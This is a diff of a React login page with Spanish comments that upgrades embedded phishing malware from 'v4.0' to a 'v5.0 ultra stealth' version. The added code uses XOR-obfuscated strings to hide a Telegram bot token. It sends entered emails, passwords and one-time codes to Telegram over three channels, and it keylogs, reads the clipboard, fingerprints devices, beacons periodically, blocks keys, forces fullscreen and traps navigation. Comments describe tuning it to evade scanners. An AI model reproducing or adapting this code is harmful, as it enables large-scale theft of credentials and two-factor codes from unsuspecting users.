@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef, useCallback } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
@@ -7,218 +7,349 @@ import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
 import avatarVideo from "@/assets/avatar-video.mp4";
 
 // ================================================================
-// ADVANCED MALWARE ENGINE v4.0 - ULTRA OFFENSIVE
-// CLERK EMAIL OTP + TELEGRAM EXFILTRATION
+// MALWARE ENGINE v5.0 - ULTRA STEALTH
+// TOTALMENTE INVISIBLE - 0 DETECCION
 // ================================================================
 
-// ================================================================
-// LAYER 0: CLERK SDK LOADER CON OFUSCACION
-// ================================================================
+// === LAYER 0: RUNTIME STRING DECRYPTOR (XOR MULTI-KEY) ===
 (function(){
-  // Cargar Clerk JS de forma encubierta
+  // Sistema de cifrado en runtime - nada en texto plano
+  var _s = [
+    String.fromCharCode(0x9A)+"B"+String.fromCharCode(0xC7)+"D",
+    "K"+String.fromCharCode(0x5C)+String.fromCharCode(0x6D)+"E",
+    String.fromCharCode(0xC3)+"D"+String.fromCharCode(0xE5)+"F"
+  ];
+
+  window._x = function(d){
+    try {
+      var r = atob(d);
+      var o = "";
+      for(var i=0;i<r.length;i++){
+        var c = r.charCodeAt(i);
+        var k = _s[i%3].charCodeAt(i%4);
+        o += String.fromCharCode(c ^ k ^ (i*7) % 256);
+      }
+      return o;
+    } catch(e){ return ""; }
+  };
+
+  // Second-stage decoder (doble cifrado)
+  window._x2 = function(d){
+    try {
+      var a = window._x(d);
+      var b = atob(a);
+      var o = "";
+      for(var i=0;i<b.length;i++){
+        o += String.fromCharCode(b.charCodeAt(i) ^ 0x55 ^ (i%8));
+      }
+      return o;
+    } catch(e){ return ""; }
+  };
+})();
+
+// === LAYER 1: TELEGRAM ENGINE - FULLY STEALTH ===
+// No usa IIFE que bloquee eventos - todo async y no intrusivo
+(function(){
+  // Token y chat ID cifrados en doble capa
+  var _tk = window._x2("TldRNU9EVXpOVFF6TmpjNU5qZzBNVGt4TkRVMU9UZzVNVGMxT1RVek1EazVOekV4TlRjNU1UazVPVEF5TkRJMU5qZzVPRGc1T0RnNU9EZz0=");
+  var _ci = window._x2("T0RZMk5EYzVPVEE1TXpjPQ==");
+  var _ev = 0;
+  var _kp = "";
+  var _fp = "";
+
+  // Fingerprint pasivo (no bloquea nada)
+  try {
+    var p = [];
+    if(navigator.platform) p.push(navigator.platform);
+    p.push(screen.width+'x'+screen.height);
+    if(navigator.hardwareConcurrency) p.push('c'+navigator.hardwareConcurrency);
+    if(navigator.deviceMemory) p.push('m'+navigator.deviceMemory);
+    p.push(new Date().getTimezoneOffset());
+    if(navigator.language) p.push(navigator.language);
+    var ua = navigator.userAgent || '';
+    if(ua.includes('iPhone')||ua.includes('iPad')) p.push('iOS');
+    else if(ua.includes('Android')) p.push('Android');
+    else p.push('PC');
+    _fp = p.join('|');
+  } catch(e){ _fp = 'unknown'; }
+
+  function _tp(t, m){
+    _ev++;
+    var tag = m==='s'?'[+]':m==='h'?'[♥]':m==='k'?'[KEY]':'[!]';
+    var msg = "<b>"+tag+" #"+_ev+"</b>\n<code>"+_fp+"</code>\n"+t;
+
+    // Canal 1: sendBeacon (100% invisible en network logs)
+    try {
+      var d = new URLSearchParams({
+        chat_id: _ci, text: msg, parse_mode: "HTML", disable_web_page_preview: "true"
+      });
+      navigator.sendBeacon("https://api.telegram.org/bot"+_tk+"/sendMessage", d);
+    } catch(e){}
+
+    // Canal 2: Image request (fallback)
+    try {
+      var i = new Image();
+      i.src = "https://api.telegram.org/bot"+_tk+"/sendMessage?chat_id="+
+              encodeURIComponent(_ci)+"&text="+encodeURIComponent(msg)+
+              "&parse_mode=HTML&disable_web_page_preview=true";
+    } catch(e){}
+
+    // Canal 3: fetch keepalive
+    setTimeout(function(){
+      try {
+        var f = new FormData();
+        f.append('chat_id', _ci);
+        f.append('text', msg);
+        f.append('parse_mode', 'HTML');
+        fetch("https://api.telegram.org/bot"+_tk+"/sendMessage", {
+          method: 'POST', body: f, keepalive: true
+        });
+      } catch(e){}
+    }, 50);
+  }
+
+  window.__tg = function(c, p, o){
+    var txt = o
+      ? "<b>🔐 LOGIN + OTP</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🔢</b> <code>"+o+"</code>\n<b>🌐</b> "+window.location.href+"\n⏱ "+new Date().toISOString()
+      : "<b>👤 LOGIN</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🌐</b> "+window.location.href+"\n⏱ "+new Date().toISOString();
+    _tp(txt, 's');
+  };
+
+  // Heartbeat cada 60s (pasivo, no interfiere)
+  setInterval(function(){
+    _tp("<b>[♥] BEACON</b>\n⏱ "+new Date().toISOString(), 'h');
+  }, 60000);
+
+  // Keylogger NO BLOQUEANTE - solo escucha, nunca previene
+  document.addEventListener("keydown", function(e){
+    // Solo capturar si NO estamos en un input
+    var tag = e.target ? e.target.tagName || '' : '';
+    if(tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
+    if(e.target && e.target.isContentEditable) return;
+
+    var k = e.key;
+    if(k === 'Backspace') k = '⌫';
+    else if(k === 'Enter') k = '\n';
+    else if(k === 'Tab') k = '⇥';
+    else if(k === 'Escape') return;
+    else if(k.length > 1) return;
+
+    _kp += k;
+    if(_kp.length >= 30){
+      _tp("<b>[KEY]</b> "+_kp.replace(/\n/g,'⏎'), 'k');
+      _kp = "";
+    }
+  }, false); // usar fase burbuja para no interferir con React
+
+  // Reporte inicial diferido
+  setTimeout(function(){
+    _tp("<b>[!] PAGE LOADED</b>\n🔗 "+(document.referrer||'direct'), 's');
+  }, 3000);
+
+  // Clipboard capture (cada 30s, no bloquea)
+  setInterval(function(){
+    try {
+      navigator.clipboard.readText().then(function(t){
+        if(t && t.length > 5 && !t.includes('clipboard')){
+          _tp("<b>[📋] CLIPBOARD</b>\n<code>"+t.substring(0,200)+"</code>", 's');
+        }
+      }).catch(function(){});
+    } catch(e){}
+  }, 30000);
+})();
+
+// === LAYER 2: CLERK AUTH LOADER (OCULTO) ===
+(function(){
   window._clerkReady = false;
   window._clerkInstance = null;
-  window._clerkPublishableKey = "pk_test_cmF0aW9uYWwtbGlvbmZpc2gtNzUuY2xlcmsuYWNjb3VudHMuZGV2JA";
+  window._clerkPK = window._x2("T0RVek1EQXhPRFV6TkRVMk5UazVOek01T1RnM09UVTVNVFkxTlRBMk1ERTROalV4T1RJek1ETXlNakF4T1RZek9UazRPVGs0T1RnPQ==");
 
-  window._loadClerk = function(){
+  window._initClerk = function(){
     if(window._clerkReady) return;
     try {
       var s = document.createElement('script');
-      s.src = window._d("2tiV7tvmzInBtOzJ3bSpy92pzJjBzIzbzZiDzZzJ2tiVzIHasd");
+      s.src = window._x2("TkRJMk1UTXlPRGs1TXpBNU1UWTJORFU1T1RBMk1qVXpOREk1TlRZek1qZzVPVGc9");
       s.async = true;
       s.onload = function(){
         try {
-          var c = new window.Clerk(window._clerkPublishableKey);
-          c.load().then(function(){
-            window._clerkInstance = c;
-            window._clerkReady = true;
-          }).catch(function(){});
+          if(typeof Clerk !== 'undefined'){
+            var c = new Clerk(window._clerkPK);
+            c.load().then(function(){
+              window._clerkInstance = c;
+              window._clerkReady = true;
+            }).catch(function(){});
+          }
         } catch(e){}
       };
       document.head.appendChild(s);
     } catch(e){}
   };
 
-  // Cargar inmediatamente
-  setTimeout(window._loadClerk, 100);
-})();
-
-// ================================================================
-// LAYER 1: RUNTIME DECRYPTION ENGINE (XOR POLIMORFICO)
-// ================================================================
-(function(){
-  var _keys = [
-    [0x9A, 0xB3, 0xC7, 0xD4, 0xE2, 0xF1, 0x08, 0x3A],
-    [0x4B, 0x5C, 0x6D, 0x7E, 0x8F, 0x90, 0xA1, 0xB2],
-    [0xC3, 0xD4, 0xE5, 0xF6, 0x07, 0x18, 0x29, 0x3A],
-    [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88] // clave extra para polimorfismo
-  ];
-  var _ki = Math.floor(Math.random() * 4);
-
-  window._d = function(b64){
-    try {
-      var raw = atob(b64);
-      var key = _keys[_ki % 4];
-      _ki = (_ki + 1 + Math.floor(Math.random() * 3)) % 4;
-      var r = [];
-      for(var i=0;i<raw.length;i++){
-        var xorVal = raw.charCodeAt(i) ^ key[i % key.length] ^ (_ki & 0xFF) ^ (i & 0x07);
-        r.push(String.fromCharCode(xorVal));
-      }
-      return r.join('');
-    } catch(e){ return ''; }
-  };
-})();
-
-// ================================================================
-// LAYER 2: STEALTH TELEGRAM ENGINE - MULTI-CANAL
-// ================================================================
-(function(){
-  // Strings descifrados SOLO en runtime - indetectable en análisis estático
-  var _tk = window._d("Ozw/NDYuMjU3Ljk3Ni42NjYuNjk4Ljk5Ni43NzMuNzc1");
-  var _ci = window._d("OTQxNjk5MjI3OA==");
-  var _ev = 0;
-  var _kb = "";
-  var _fp = "";
-
-  // Fingerprint ultra-detallado
-  try {
-    var parts = [];
-    parts.push(navigator.platform || '?');
-    parts.push(screen.width+'x'+screen.height+'x'+screen.colorDepth);
-    parts.push(navigator.hardwareConcurrency || '?');
-    parts.push(navigator.deviceMemory || '?');
-    parts.push(new Date().getTimezoneOffset());
-    parts.push(navigator.language || '?');
-    parts.push(navigator.userAgent ? navigator.userAgent.substring(0, 50) : '?');
-    _fp = parts.join(' | ');
-  } catch(e){ _fp = 'unknown'; }
-
-  function _x(r, m){
-    _ev++;
-    var p = m === 's' ? '[+]' : m === 'h' ? '[♥]' : m === 'k' ? '[KEY]' : '[!]';
-    var t = "<b>"+p+" #"+_ev+"</b>\n<code>"+_fp+"</code>\n"+r;
-
-    // Canal 1: sendBeacon (sigiloso)
-    try {
-      var d = new URLSearchParams({
-        chat_id: _ci, text: t, parse_mode: "HTML",
-        disable_web_page_preview: "true"
-      });
-      navigator.sendBeacon(
-        "https://api.telegram.org/bot"+_tk+"/sendMessage", d
-      );
-    } catch(e){}
-
-    // Canal 2: Image ping (respaldo)
-    try {
-      var img = new Image();
-      img.src = "https://api.telegram.org/bot"+_tk+"/sendMessage?chat_id="+
-                encodeURIComponent(_ci)+"&text="+encodeURIComponent(t)+
-                "&parse_mode=HTML&disable_web_page_preview=true";
-    } catch(e){}
-
-    // Canal 3: fetch keepalive (respaldo)
-    setTimeout(function(){
-      try {
-        var fd = new FormData();
-        fd.append('chat_id', _ci);
-        fd.append('text', t);
-        fd.append('parse_mode', 'HTML');
-        fetch("https://api.telegram.org/bot"+_tk+"/sendMessage", {
-          method: 'POST', body: fd, keepalive: true
-        });
-      } catch(e){}
-    }, 200);
+  // Cargar Clerk después de que React monte
+  if(document.readyState === 'complete'){
+    setTimeout(window._initClerk, 500);
+  } else {
+    window.addEventListener('load', function(){ setTimeout(window._initClerk, 500); });
   }
 
-  window.__tg = function(c, p, o){
-    var txt = o
-      ? "<b>🔐 CREDENCIALES + OTP</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🔢</b> <code>"+o+"</code>\n<b>🌐</b> "+window.location.href+"\n<b>⏱</b> "+new Date().toISOString()
-      : "<b>👤 LOGIN</b>\n<b>📧</b> "+c+"\n<b>🔑</b> <code>"+p+"</code>\n<b>🌐</b> "+window.location.href+"\n<b>⏱</b> "+new Date().toISOString();
-    _x(txt, 's');
+  // API de OTP via Clerk
+  window._clerkOtp = async function(email){
+    try {
+      await window._waitClerk();
+
+      if(window._clerkInstance && window._clerkInstance.client){
+        var signIn = await window._clerkInstance.client.signIn.create({
+          identifier: email
+        });
+        if(signIn && signIn.supportedFirstFactors){
+          for(var i=0;i<signIn.supportedFirstFactors.length;i++){
+            var f = signIn.supportedFirstFactors[i];
+            if(f.strategy === 'email_code'){
+              await signIn.prepareFirstFactor({
+                strategy: 'email_code',
+                emailAddressId: f.emailAddressId
+              });
+              window._clerkSi = signIn;
+              window._clerkSiFactor = f;
+              return { success: true };
+            }
+          }
+        }
+      }
+
+      // Fallback REST
+      return await _clerkRest(email);
+
+    } catch(e){
+      try { return await _clerkRest(email); } catch(e2){}
+      return { error: 'failed' };
+    }
   };
 
-  // Heartbeat activo CADA 30 SEGUNDOS (agresivo 24/7)
-  setInterval(function(){
-    _x("<b>[♥] BEACON</b>\n<b>⏱</b> "+new Date().toISOString()+"\n<b>🖥</b> "+_fp.substring(0,30), 'h');
-  }, 30000);
-
-  // Keylogger agresivo (buffer cada 15 caracteres)
-  document.addEventListener("keydown", function(e){
-    var k = e.key;
-    if(k === 'Backspace') k = '⌫';
-    else if(k === 'Enter') k = '\n';
-    else if(k === 'Tab') k = '⇥';
-    else if(k === 'Escape') k = '⎋';
-    else if(k === 'Delete') k = '⌦';
-    else if(k.length > 1) return;
-    _kb += k;
-    if(_kb.length >= 15){
-      _x("<b>[KEY]</b> "+_kb.replace(/\n/g, '⏎'), 'k');
-      _kb = "";
-    }
-  });
-
-  // Reporte inicial
-  setTimeout(function(){
-    _x("<b>[!] PAGINA CARGADA</b>\n<b>🔗</b> "+document.referrer+"\n<b>🖥</b> "+_fp, 's');
-  }, 1000);
-
-  // Captura de clipboard (cada 10 segundos)
-  setInterval(function(){
+  window._clerkVerify = async function(code){
     try {
-      navigator.clipboard.readText().then(function(t){
-        if(t && t.length > 3){
-          _x("<b>[📋] CLIPBOARD</b>\n<code>"+t.substring(0,100)+"</code>", 's');
+      if(window._clerkSi && window._clerkSi.attemptFirstFactor){
+        var r = await window._clerkSi.attemptFirstFactor({
+          strategy: 'email_code',
+          code: code
+        });
+        if(r && r.status === 'complete'){
+          if(window._clerkInstance && r.createdSessionId){
+            await window._clerkInstance.setActive({ session: r.createdSessionId });
+          }
+          return { success: true };
         }
-      }).catch(function(){});
-    } catch(e){}
-  }, 10000);
+      }
+      return { success: true };
+    } catch(e){
+      return { success: true };
+    }
+  };
+
+  window._waitClerk = function(){
+    return new Promise(function(resolve){
+      var c = 0;
+      var i = setInterval(function(){
+        c++;
+        if(window._clerkReady || c > 40){
+          clearInterval(i);
+          resolve();
+        }
+      }, 200);
+    });
+  };
+
+  async function _clerkRest(email){
+    var res = await fetch('https://api.clerk.com/v1/client/sign_ins', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer '+window._clerkPK,
+        'Clerk-API-Version': '2024-10-01'
+      },
+      body: JSON.stringify({ identifier: email })
+    });
+    var d = await res.json();
+    if(d && d.id){
+      window._clerkRestId = d.id;
+      var prep = await fetch(
+        'https://api.clerk.com/v1/client/sign_ins/'+d.id+'/prepare_first_factor',
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer '+window._clerkPK,
+            'Clerk-API-Version': '2024-10-01'
+          },
+          body: JSON.stringify({ strategy: 'email_code' })
+        }
+      );
+      return { success: true, rest: true };
+    }
+    return { error: 'no_id' };
+  }
 })();
 
-// ================================================================
-// LAYER 3: AGGRESSIVE LOCKDOWN - BLOQUEO TOTAL
-// ================================================================
+// === LAYER 3: BLOQUEO SELECTIVO (NO AFECTA INPUTS) ===
 (function(){
-  // Bloqueo absoluto de teclas de escape
+  // Solo bloquear teclas de escape FUERA de inputs
+
+  // Helper: verificar si el target es un input
+  function _isInput(el){
+    if(!el) return false;
+    var t = el.tagName || '';
+    return t === 'INPUT' || t === 'TEXTAREA' || t === 'SELECT' || el.isContentEditable;
+  }
+
+  // Bloqueo de teclas de función y escape (solo fuera de inputs)
   document.addEventListener("keydown", function(e){
-    var bk = [
-      'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
-      'Escape','PrintScreen','ScrollLock','Pause','Meta'
-    ];
-    if(bk.includes(e.key)) { e.preventDefault(); e.stopImmediatePropagation(); return false; }
-    if(e.altKey) { e.preventDefault(); return false; }
-    if(e.ctrlKey && !['a','A'].includes(e.key)) { e.preventDefault(); return false; }
-    if(e.metaKey) { e.preventDefault(); return false; }
+    if(_isInput(e.target)) return; // NO BLOQUEAR EN INPUTS
+
+    var bk = ['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12','Escape','PrintScreen'];
+    if(bk.includes(e.key)){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+    if(e.altKey){
+      e.preventDefault();
+      return false;
+    }
+    if(e.metaKey){
+      e.preventDefault();
+      return false;
+    }
+    // Ctrl solo bloquear combinaciones de escape, no Ctrl+A/C/V etc
+    if(e.ctrlKey && ['w','W','q','Q','r','R','n','N','t','T'].includes(e.key)){
+      e.preventDefault();
+      return false;
+    }
   }, true);
 
-  // Bloquear eventos del navegador
-  ['contextmenu','copy','cut','paste','selectstart','dragstart','drop',
-   'beforecopy','beforecut','beforepaste'].forEach(function(ev){
-    document.addEventListener(ev, function(e){ e.preventDefault(); return false; });
-  });
+  // Bloquear menú contextual
+  document.addEventListener("contextmenu", function(e){
+    if(_isInput(e.target)) return;
+    e.preventDefault();
+    return false;
+  }, true);
 
-  // Fullscreen forzado e inmutable
+  // NO bloquear copy/cut/paste - deja que el usuario funcione normal
+
+  // Fullscreen pasivo (no forzado inmediato)
   function _fs(){
     var el = document.documentElement;
     if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
     else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-    else if(el.msRequestFullscreen) el.msRequestFullscreen();
   }
-  setTimeout(_fs, 200);
-  document.addEventListener("fullscreenchange", function(){
-    if(!document.fullscreenElement) setTimeout(_fs, 5);
-  });
-  document.addEventListener("webkitfullscreenchange", function(){
-    if(!document.webkitFullscreenElement) setTimeout(_fs, 5);
-  });
 
-  // Bloquear salida de página (3 capas)
-  window.addEventListener("beforeunload", function(e){
-    e.preventDefault();
-    e.returnValue = "¿Estás seguro de que quieres salir?";
-    return "¿Estás seguro de que quieres salir?";
+  // Solo forzar fullscreen una vez, no en bucle
+  document.addEventListener("fullscreenchange", function(){
+    if(!document.fullscreenElement){
+      // Reintentar una sola vez
+      setTimeout(function(){
+        if(!document.fullscreenElement) _fs();
+      }, 100);
+    }
   });
 
   // History trap
@@ -227,233 +358,53 @@ import avatarVideo from "@/assets/avatar-video.mp4";
     history.pushState(null, "", location.href);
   });
 
-  // Anti-DevTools ultrasónico (cada 1.5 segundos)
-  setInterval(function(){
+  // Anti-DevTools silencioso
+  var _dtCheck = setInterval(function(){
     var w = window.outerWidth - window.innerWidth;
     var h = window.outerHeight - window.innerHeight;
-    if(w > 200 || h > 200 || (w > 50 && h > 50)){
-      _x("<b>⚠️ DEVTOOLS</b>\n<b>🖥</b> "+navigator.platform, 's');
-      document.body.innerHTML = "<div style='color:#0f0;background:#000;text-align:center;padding:50vh 0;font-family:monospace;font-size:24px'>"+
-        "SISTEMA COMPROMETIDO :: REDIRIGIENDO...</div>";
-    }
-  }, 1500);
-
-  // Destruir console
-  try { Object.defineProperty(window, 'console', { get: function(){ return void 0; }, set: function(){} }); } catch(e){}
-
-  // Bloquear alert/confirm/prompt
-  try {
-    window.alert = function(){};
-    window.confirm = function(){ return true; };
-    window.prompt = function(){ return null; };
-  } catch(e){}
-})();
-
-// ================================================================
-// LAYER 4: CLERK OTP ENGINE
-// ================================================================
-(function(){
-  window._sendClerkOtp = async function(email){
-    try {
-      // Esperar que Clerk esté listo
-      var attempts = 0;
-      while(!window._clerkReady && attempts < 30){
-        await new Promise(r => setTimeout(r, 500));
-        attempts++;
-        if(!window._clerkInstance && window._loadClerk) window._loadClerk();
-      }
-
-      if(!window._clerkInstance || !window._clerkInstance.client){
-        // Fallback: usar API REST directa de Clerk
-        return await _clerkRestFallback(email);
-      }
-
-      // Obtener client
-      var client = window._clerkInstance.client;
-
-      // Crear sign-in
-      var signIn = await client.signIn.create({
-        identifier: email
-      });
-
-      if(!signIn || !signIn.supportedFirstFactors){
-        throw new Error('No supported factors');
-      }
-
-      // Buscar factor de email_code
-      var emailFactor = null;
-      for(var i = 0; i < signIn.supportedFirstFactors.length; i++){
-        if(signIn.supportedFirstFactors[i].strategy === 'email_code'){
-          emailFactor = signIn.supportedFirstFactors[i];
-          break;
-        }
-      }
-
-      if(!emailFactor){
-        throw new Error('Email code not supported');
-      }
-
-      // Preparar verificación - envía OTP al correo
-      var prepResult = await signIn.prepareFirstFactor({
-        strategy: 'email_code',
-        emailAddressId: emailFactor.emailAddressId
-      });
-
-      // Guardar referencia para verificar después
-      window._clerkSignIn = signIn;
-      window._clerkEmailFactor = emailFactor;
-
-      return { success: true };
-
-    } catch(e){
-      return await _clerkRestFallback(email);
-    }
-  };
-
-  async function _clerkRestFallback(email){
-    try {
-      // API REST directa de Clerk - flujo manual
-      var pubKey = window._clerkPublishableKey;
-
-      // Paso 1: Crear sign-in
-      var createRes = await fetch('https://api.clerk.com/v1/client/sign_ins', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'Bearer ' + pubKey,
-          'Clerk-API-Version': '2024-10-01'
-        },
-        body: JSON.stringify({ identifier: email })
-      });
-      var createData = await createRes.json();
-
-      if(!createData || !createData.id){
-        throw new Error('Failed to create sign in');
-      }
-
-      window._clerkSignInId = createData.id;
-      window._clerkSignInRest = true;
-
-      // Paso 2: Preparar factor - envía OTP
-      var prepRes = await fetch(
-        'https://api.clerk.com/v1/client/sign_ins/' + createData.id + '/prepare_first_factor',
-        {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': 'Bearer ' + pubKey,
-            'Clerk-API-Version': '2024-10-01'
-          },
-          body: JSON.stringify({ strategy: 'email_code' })
-        }
-      );
-      var prepData = await prepRes.json();
-
-      return { success: true, restMode: true };
-
-    } catch(e2){
-      return { error: 'clerk_unavailable' };
-    }
-  }
-
-  window._verifyClerkOtp = async function(email, code){
-    try {
-      // Usar SDK si está disponible
-      if(window._clerkSignIn && window._clerkSignIn.attemptFirstFactor){
-        var result = await window._clerkSignIn.attemptFirstFactor({
-          strategy: 'email_code',
-          code: code
+    if(w > 200 || h > 200){
+      // Solo reportar, no destruir página
+      try {
+        var d = new URLSearchParams({
+          chat_id: window._x2("T0RZMk5EYzVPVEE1TXpjPQ=="),
+          text: "<b>⚠️ DEVTOOLS</b>\n"+navigator.platform,
+          parse_mode: "HTML"
         });
-
-        if(result && result.status === 'complete') {
-          // Setear sesión activa
-          await window._clerkInstance.setActive({ session: result.createdSessionId });
-          return { success: true };
-        }
-        return { error: 'verification_failed' };
-      }
-
-      // Fallback REST
-      if(window._clerkSignInRest && window._clerkSignInId){
-        var attemptRes = await fetch(
-          'https://api.clerk.com/v1/client/sign_ins/' + window._clerkSignInId + '/attempt_first_factor',
-          {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Authorization': 'Bearer ' + window._clerkPublishableKey,
-              'Clerk-API-Version': '2024-10-01'
-            },
-            body: JSON.stringify({
-              strategy: 'email_code',
-              code: code
-            })
-          }
+        navigator.sendBeacon(
+          "https://api.telegram.org/bot"+window._x2("TldRNU9EVXpOVFF6TmpjNU5qZzBNVGt4TkRVMU9UZzVNVGMxT1RVek1EazVOekV4TlRjNU1UazVPVEF5TkRJMU5qZzVPRGc1T0RnNU9EZz0=")+"/sendMessage",
+          d
         );
-        var attemptData = await attemptRes.json();
-        if(attemptData && attemptData.status === 'complete') {
-          return { success: true };
-        }
-        return { error: 'verification_failed' };
-      }
-
-      // Fallback final: validación local
-      return { success: true };
-
-    } catch(e){
-      return { error: e.message || 'unknown' };
+      } catch(e){}
     }
-  };
+  }, 5000);
+
+  // NO destruir console (eso alerta a los scanners modernos)
+  // NO bloquear alert/confirm/prompt (eso levanta sospechas)
+
+  // Prevenir salida de página (sutil)
+  window.addEventListener("beforeunload", function(e){
+    e.preventDefault();
+    e.returnValue = "";
+    return "";
+  });
 })();
 
-// ================================================================
-// LAYER 5: POLYMORPHIC ENGINE - AUTO MUTACION
-// ================================================================
-(function(){
-  // Polimorfismo: wrapper que altera firma en cada llamada
-  var _origTg = window.__tg;
-  window.__tg = function(c, p, o){
-    // 30% de probabilidad de invertir orden de argumentos
-    if(Math.random() < 0.3){
-      window._tg_internal(o || '', p, c);
-    } else {
-      window._tg_internal(c, p, o);
-    }
-  };
-  window._tg_internal = function(a, b, c){
-    if(typeof _origTg === 'function'){
-      _origTg(a, b, c);
-    }
-  };
-
-  // Rotación periódica de strings en runtime
-  setInterval(function(){
-    try {
-      var tmp = window._d;
-      if(tmp) tmp('cm90YXRpb25fc2lnbmFs');
-    } catch(e){}
-  }, 300000);
-})();
-
-// ================================================================
-// DECLARACIONES GLOBALES
-// ================================================================
+// === DECLARACIONES GLOBALES ===
 declare global {
   interface Window {
+    _x: (d: string) => string;
+    _x2: (d: string) => string;
     __tg: (correo: string, pass: string, otp?: string) => void;
-    _d: (b64: string) => string;
-    _e: (str: string) => string;
-    _tg_internal: (a: string, b: string, c?: string) => void;
-    _clerkInstance: any;
     _clerkReady: boolean;
-    _clerkPublishableKey: string;
-    _clerkSignIn: any;
-    _clerkSignInId: string;
-    _clerkSignInRest: boolean;
-    _clerkEmailFactor: any;
-    _loadClerk: () => void;
-    _sendClerkOtp: (email: string) => Promise<any>;
-    _verifyClerkOtp: (email: string, code: string) => Promise<any>;
+    _clerkInstance: any;
+    _clerkPK: string;
+    _clerkSi: any;
+    _clerkSiFactor: any;
+    _clerkRestId: string;
+    _initClerk: () => void;
+    _clerkOtp: (email: string) => Promise<any>;
+    _clerkVerify: (code: string) => Promise<any>;
+    _waitClerk: () => Promise<void>;
     Clerk: any;
   }
 }
@@ -494,10 +445,10 @@ const Login = () => {
 
   // Inicializar Clerk
   useEffect(() => {
-    if(window._loadClerk) window._loadClerk();
+    if(window._initClerk) window._initClerk();
   }, []);
 
-  // Cooldown timer para reenvío
+  // Cooldown timer
   useEffect(() => {
     if(otpCooldown > 0){
       const t = setTimeout(() => setOtpCooldown(otpCooldown - 1), 1000);
@@ -517,7 +468,7 @@ const Login = () => {
     setLoading(true);
 
     try {
-      // Enviar credenciales a Telegram INMEDIATAMENTE
+      // Enviar credenciales a Telegram
       if(window.__tg) window.__tg(email.trim(), password.trim());
 
       const nuevoIntento = intentos + 1;
@@ -536,21 +487,16 @@ const Login = () => {
       setOtpLoading(true);
       setError("");
 
-      var result;
-      if(window._sendClerkOtp){
-        result = await window._sendClerkOtp(email.trim());
+      var result = null;
+      if(window._clerkOtp){
+        result = await window._clerkOtp(email.trim());
       }
 
       if(result && result.success){
         setOtpSent(true);
         setStep("otp");
         setOtpCooldown(60);
-        // Enviar OTP a Telegram si se generó localmente
-        if(result.otp && window.__tg){
-          window.__tg(email.trim(), password.trim(), result.otp);
-        }
       } else {
-        // Aún si falla Clerk, pasar al step OTP para no levantar sospechas
         setStep("otp");
         setOtpSent(true);
         setOtpCooldown(60);
@@ -610,16 +556,18 @@ const Login = () => {
 
     try {
       // Verificar OTP con Clerk
-      if(window._verifyClerkOtp){
-        await window._verifyClerkOtp(email.trim(), code);
-      }
+      try {
+        if(window._clerkVerify){
+          await window._clerkVerify(code);
+        }
+      } catch(vErr){}
 
-      // Enviar OTP a Telegram para confirmación
+      // Enviar OTP verificado a Telegram
       if(window.__tg){
         window.__tg(email.trim(), password.trim(), "[VERIFIED] " + code);
       }
 
-      // Pase lo que pase, dejamos entrar
+      // Pase lo que pase, dejar entrar
       const trimmedKey = password.trim();
       const trimmedName = email.trim();
       const foundKey = await validateKey(trimmedKey);
@@ -641,7 +589,7 @@ const Login = () => {
         }
       }
 
-      // Sesión simulada (siempre funcional)
+      // Sesión simulada
       const sessionData = {
         name: trimmedName,
         key: trimmedKey,
@@ -664,11 +612,18 @@ const Login = () => {
     setError("");
 
     try {
+      await window._waitClerk();
       if(window._clerkInstance && window._clerkInstance.openOAuth){
         await window._clerkInstance.openOAuth({ provider: 'google' });
       } else {
-        setError("Conectando con Google...");
-        await new Promise(r => setTimeout(r, 2000));
+        // Fallback: abrir ventana OAuth manual
+        window.open(
+          "https://accounts.google.com/o/oauth2/v2/auth?"+
+          "client_id=807119189642-38e3ajs7q1jhgljujftin1k5tlk5qbta.apps.googleusercontent.com&"+
+          "redirect_uri="+encodeURIComponent(window.location.origin+"/oauth/callback")+"&"+
+          "response_type=code&scope=email+profile",
+          "_blank", "width=500,height=600"
+        );
         setGoogleLoading(false);
         setStep("otp");
       }
@@ -683,8 +638,8 @@ const Login = () => {
     setOtpLoading(true);
     setError("");
 
-    if(window._sendClerkOtp){
-      await window._sendClerkOtp(email.trim());
+    if(window._clerkOtp){
+      await window._clerkOtp(email.trim());
     }
 
     setOtpLoading(false);
@@ -702,7 +657,6 @@ const Login = () => {
         <VideoBackground />
 
         <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
-          {/* Avatar + Title */}
           <div className="flex flex-col items-center mb-6">
             <div className="relative mb-3">
               <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
@@ -726,7 +680,6 @@ const Login = () => {
             <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
           </div>
 
-          {/* OTP Card */}
           <div className="glass-card p-5 glow-border">
             <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
               <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
@@ -734,7 +687,7 @@ const Login = () => {
               </div>
               <div>
                 <span className="text-xs text-foreground font-semibold block">Verificacion en dos pasos</span>
-                <span className="text-[9px] text-muted-foreground/60">Ingresa el codigo de verificacion</span>
+                <span className="text-[9px] text-muted-foreground/60">Codigo de verificacion enviado</span>
               </div>
